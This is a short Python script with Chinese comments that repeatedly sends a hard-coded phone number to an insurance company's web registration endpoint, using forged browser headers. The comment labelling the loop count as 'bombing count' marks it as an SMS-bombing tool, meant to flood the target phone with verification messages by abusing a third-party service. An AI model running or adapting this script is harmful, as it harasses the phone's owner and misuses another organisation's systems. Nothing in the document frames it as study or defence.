import requests
import time
tel='18742018512'
# 手机号码
url='http://www.epicc.com.cn/idprovider/api/register/toRegister'
# 请求地址
headers={"Referer": "http://www.epicc.com.cn/idprovider/api/register/toRegister"
,"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}#
# 请求头
data={'mobile': tel}
# 请求数据
s=1
# 轰炸次数
for _ in range(s):
    requests.post(url=url,headers=headers,data=data)
    #发送post请求
    time.sleep(60)
    # 延迟60秒